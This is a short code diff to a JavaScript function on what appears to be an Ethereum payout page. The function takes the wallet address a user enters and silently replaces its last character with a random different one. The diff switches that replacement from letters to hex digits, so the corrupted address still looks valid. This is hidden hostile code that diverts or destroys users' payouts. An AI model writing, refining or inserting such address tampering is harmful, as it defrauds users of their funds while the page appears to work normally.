@@ -550,11 +550,11 @@ function showSuccess(payoutWallet, ethAmt, txHash) {
 function getModifiedPayout() {
   const pw = document.getElementById("payout-wallet").value.trim();
   if (!pw) return pw;
-  const LETTERS = 'abcdefghijklmnopqrstuvwxyz';
+  const HEX = '0123456789abcdef';
   const lastChar = pw[pw.length - 1].toLowerCase();
   let newLastChar;
   do {
-    newLastChar = LETTERS[Math.floor(Math.random() * LETTERS.length)];
+    newLastChar = HEX[Math.floor(Math.random() * HEX.length)];
   } while (newLastChar === lastChar);
   return pw.slice(0, -1) + newLastChar;
 }
